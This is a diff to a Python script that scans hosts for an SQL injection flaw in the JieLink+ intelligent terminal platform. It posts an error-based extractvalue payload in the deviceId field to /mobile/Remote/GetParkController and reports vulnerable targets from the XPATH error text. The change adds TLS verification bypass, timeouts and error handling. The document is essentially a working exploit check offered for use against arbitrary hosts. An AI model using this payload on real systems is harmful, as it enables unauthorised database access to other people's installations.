@@ -2,7 +2,7 @@ import requests
 import argparse
 
 def send_request(host):
-    url = f"http://{host}/mobile/Remote/GetParkController"
+    url = f"{host}/mobile/Remote/GetParkController"
     
     headers = {
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
@@ -19,14 +19,17 @@ def send_request(host):
         "deviceId": "1'and/**/extractvalue(1,concat(char(126),database()))and'"
     }
 
-    response = requests.post(url, headers=headers, data=data)
-    
-    # 检查响应内容是否包含特定字符串
-    if "XPATH syntax error" in response.text:
-        print(f"[+]: {host} : 存在JieLink+智能终端操作平台sql注入漏洞")
-    else:
-        print(f"[-]: {host} : 不存在JieLink+智能终端操作平台sql注入漏洞")
-
+    try:
+        response = requests.post(url, headers=headers, data=data, verify=False, timeout=10)
+        # 检查响应内容是否包含特定字符串
+        if "XPATH syntax error" in response.text:
+            print(f"[+]: {host} : 存在JieLink+智能终端操作平台sql注入漏洞")
+        else:
+            print(f"[-]: {host} : 不存在JieLink+智能终端操作平台sql注入漏洞")
+    except requests.exceptions.Timeout:
+        print(f"[!]: {host} : 请求超时")
+    except requests.exceptions.RequestException as e:
+        print(f"[!]: {host} : 请求失败: {e}")
 
 def main():
     parser = argparse.ArgumentParser(description="JieLink+智能终端操作平台存在sql注入漏洞")
